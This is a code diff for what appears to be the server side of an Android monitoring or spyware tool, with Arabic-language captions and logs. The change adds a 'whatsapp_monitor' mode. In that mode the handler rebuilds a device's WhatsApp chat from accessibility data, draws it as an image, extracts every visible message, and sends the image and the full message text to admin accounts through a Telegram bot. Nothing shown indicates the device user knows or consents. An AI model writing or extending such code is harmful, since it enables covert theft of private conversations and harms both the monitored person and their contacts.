@@ -2138,9 +2138,14 @@ def _sock_screen_json(data):
 
 
 def _handle_screen_json(dev, data):
-    """Render the accessibility tree JSON as an image using Pillow and send to bot."""
+    """Render the accessibility tree JSON as an image using Pillow and send to bot.
+
+    If source == 'whatsapp_monitor', draws a WhatsApp-style chat interface
+    (green header, chat bubbles, sender names) + a text box below with all messages.
+    Otherwise draws a generic screen layout.
+    """
     try:
-        from PIL import Image, ImageDraw, ImageFont
+        from PIL import Image, ImageDraw, ImageFont, ImageFilter
         import io as _io
         import re as _re
         import time as _time
@@ -2164,69 +2169,191 @@ def _handle_screen_json(dev, data):
     screen_h = data.get("screen_height", 1920)
     package = data.get("package", "unknown")
     views = data.get("views", [])
+    source = data.get("source", "manual")  # whatsapp_monitor or manual
 
-    scale = 720.0 / max(screen_w, 1)
-    img_w = int(screen_w * scale)
-    img_h = int(screen_h * scale)
+    # Load fonts — try Arabic-capable font first, fallback to DejaVu
+    def _load_font(size):
+        candidates = [
+            "/usr/share/fonts/truetype/chinese/NotoSansSC-Regular.ttf",
+            "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
+            "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
+        ]
+        for path in candidates:
+            try:
+                return ImageFont.truetype(path, size)
+            except Exception:
+                continue
+        return ImageFont.load_default()
 
-    img = Image.new("RGB", (img_w, img_h), "white")
-    draw = ImageDraw.Draw(img)
+    font_title = _load_font(16)
+    font_msg = _load_font(12)
+    font_small = _load_font(10)
 
-    try:
-        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
-        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
-    except Exception:
-        font = ImageFont.load_default()
-        font_small = font
-
-    draw.rectangle([0, 0, img_w, 30], fill="#2196F3")
-    draw.text((5, 5), f"PKG: {package}", fill="white", font=font)
-    draw.text((img_w - 150, 5), f"views: {len(views)}", fill="white", font=font_small)
-
+    # ────────────────────────────────────────────────────────────
+    # Parse all views: collect (text, x, y, w, h, is_outgoing)
+    # ────────────────────────────────────────────────────────────
+    parsed = []
     for v in views:
         bounds_str = v.get("bounds", "")
         m = _re.match(r"\[(\d+),(\d+)\]\[(\d+)x(\d+)\]", bounds_str)
         if not m:
             continue
         x, y, w, h = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))
-        x = int(x * scale); y = int(y * scale)
-        w = int(w * scale); h = int(h * scale)
-
         text = v.get("text", "") or v.get("desc", "")
-        if not text:
+        if not text or len(text) < 1:
             continue
+        # Heuristic: if x > screen_w / 2, it's an outgoing message (right side)
+        is_outgoing = x > (screen_w / 2)
+        parsed.append({"text": text, "x": x, "y": y, "w": w, "h": h, "out": is_outgoing})
 
-        draw.rectangle([x, y, x + w, y + h], outline="#4CAF50", width=1)
-        display_text = text[:40]
+    # Sort by Y (top to bottom)
+    parsed.sort(key=lambda v: v["y"])
+
+    # ────────────────────────────────────────────────────────────
+    # Build the screenshot image (WhatsApp-style if from monitor)
+    # ────────────────────────────────────────────────────────────
+    scale = 720.0 / max(screen_w, 1)
+    img_w = int(screen_w * scale)
+    img_h = int(screen_h * scale)
+
+    # WhatsApp colors
+    if source == "whatsapp_monitor" or "whatsapp" in package:
+        bg_color = (236, 229, 221)  # #ECE5DD — WhatsApp chat bg
+        header_color = (7, 94, 84)   # #075E54 — WhatsApp green dark
+        bubble_out_color = (210, 248, 192)  # #D2F8C0 — outgoing bubble (light green)
+        bubble_in_color = (255, 255, 255)   # white — incoming bubble
+        bubble_out_text = (0, 0, 0)
+        bubble_in_text = (0, 0, 0)
+        app_name = "واتساب"
+    else:
+        bg_color = (255, 255, 255)
+        header_color = (33, 150, 243)  # blue
+        bubble_out_color = (33, 150, 243)
+        bubble_in_color = (240, 240, 240)
+        bubble_out_text = (255, 255, 255)
+        bubble_in_text = (0, 0, 0)
+        app_name = package
+
+    img = Image.new("RGB", (img_w, img_h), bg_color)
+    draw = ImageDraw.Draw(img)
+
+    # Header bar
+    header_h = 40
+    draw.rectangle([0, 0, img_w, header_h], fill=header_color)
+    # Back arrow
+    draw.text((5, 10), "‹", fill="white", font=font_title)
+    draw.text((25, 12), f"{app_name}", fill="white", font=font_title)
+    # View count on right
+    draw.text((img_w - 80, 14), f"عدد: {len(parsed)}", fill="white", font=font_small)
+
+    # Draw each message as a chat bubble
+    chat_start_y = header_h + 5
+    for v in parsed:
+        x = int(v["x"] * scale)
+        y = int(v["y"] * scale)
+        w = int(v["w"] * scale)
+        h = int(v["h"] * scale)
+
+        text = v["text"][:80]
         try:
-            bbox = draw.textbbox((0, 0), display_text, font=font_small)
+            bbox = draw.textbbox((0, 0), text, font=font_msg)
             text_w = bbox[2] - bbox[0]
+            text_h = bbox[3] - bbox[1]
         except Exception:
-            text_w = 50
-        draw.rectangle([x, max(0, y - 12), x + text_w + 4, y], fill="#4CAF50")
-        draw.text((x + 2, max(0, y - 12)), display_text, fill="white", font=font_small)
+            text_w, text_h = 60, 12
 
+        # Bubble padding
+        pad = 6
+        bubble_w = min(max(text_w + pad * 2, 40), img_w - 20)
+        bubble_h = max(text_h + pad * 2, 22)
+
+        if v["out"]:
+            # Outgoing — right side, green bubble
+            bx = img_w - bubble_w - 10
+            by = max(y, chat_start_y)
+            # Rounded bubble
+            draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
+                                   radius=8, fill=bubble_out_color)
+            draw.text((bx + pad, by + pad), text, fill=bubble_out_text, font=font_msg)
+        else:
+            # Incoming — left side, white bubble
+            bx = 10
+            by = max(y, chat_start_y)
+            draw.rounded_rectangle([bx, by, bx + bubble_w, by + bubble_h],
+                                   radius=8, fill=bubble_in_color)
+            draw.text((bx + pad, by + pad), text, fill=bubble_in_text, font=font_msg)
+
+    # ────────────────────────────────────────────────────────────
+    # Build the text box: combine all messages into one block
+    # ────────────────────────────────────────────────────────────
+    text_lines = []
+    for v in parsed:
+        prefix = "→ " if v["out"] else "← "
+        text_lines.append(f"{prefix}{v['text'][:100]}")
+    combined_text = "\n".join(text_lines)
+
+    # Save the screenshot image
+    img_bio = _io.BytesIO()
+    img.save(img_bio, format="PNG")
+    img_bio.seek(0)
+
+    # ────────────────────────────────────────────────────────────
+    # Send to bot: image first, then text box
+    # ────────────────────────────────────────────────────────────
     if mdm_bot:
         short_label = _dev_label(dev)
-        bio = _io.BytesIO()
-        img.save(bio, format="PNG")
-        bio.seek(0)
+        ts = int(_time.time())
+
+        # Build caption
+        if source == "whatsapp_monitor":
+            caption = (
+                f"💬 <b>واجهة واتساب (مرسومة)</b>\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📱 <b>{short_label}</b>\n"
+                f"📦 التطبيق: <code>{package}</code>\n"
+                f"📐 العناصر: {len(parsed)}\n"
+                f"📏 الشاشة: {screen_w}×{screen_h}\n"
+                f"🕐 الوقت: {_time.strftime('%H:%M:%S')}"
+            )
+        else:
+            caption = (
+                f"📋 <b>لقطة شاشة (JSON rendered)</b>\n\n"
+                f"📱 <b>{short_label}</b>\n"
+                f"📦 التطبيق: <code>{package}</code>\n"
+                f"📐 العناصر: {len(parsed)}\n"
+                f"📏 الشاشة: {screen_w}×{screen_h}"
+            )
 
         for admin_id in Config.ADMIN_IDS:
+            # Send the rendered image
             try:
                 mdm_bot.bot.send_photo(
                     admin_id,
-                    photo=bio,
-                    caption=f"📋 <b>لقطة شاشة (JSON rendered)</b>\n\n"
-                            f"📱 <b>{short_label}</b>\n"
-                            f"📦 التطبيق: <code>{package}</code>\n"
-                            f"📐 العناصر: {len(views)}\n"
-                            f"📏 الشاشة: {screen_w}x{screen_h}",
+                    photo=img_bio,
+                    caption=caption,
                     parse_mode="HTML"
                 )
-                bio.seek(0)
+                img_bio.seek(0)
             except Exception as e:
-                logger.error(f"فشل إرسال screen_json image: {e}")
+                logger.error(f"فشل إرسال الصورة: {e}")
+
+            # Send the text box (all messages combined)
+            try:
+                if combined_text:
+                    # Truncate to Telegram limit (4096 chars)
+                    text_display = combined_text[:3800]
+                    if len(combined_text) > 3800:
+                        text_display += "\n...(truncated)"
+
+                    mdm_bot.bot.send_message(
+                        admin_id,
+                        f"📝 <b>كل النصوص الموجودة على الشاشة</b>\n"
+                        f"━━━━━━━━━━━━━━━\n"
+                        f"<code>{text_display}</code>",
+                        parse_mode="HTML"
+                    )
+            except Exception as e:
+                logger.error(f"فشل إرسال مربع النص: {e}")
 
     _pending_cmds.pop(request.sid, None)
 
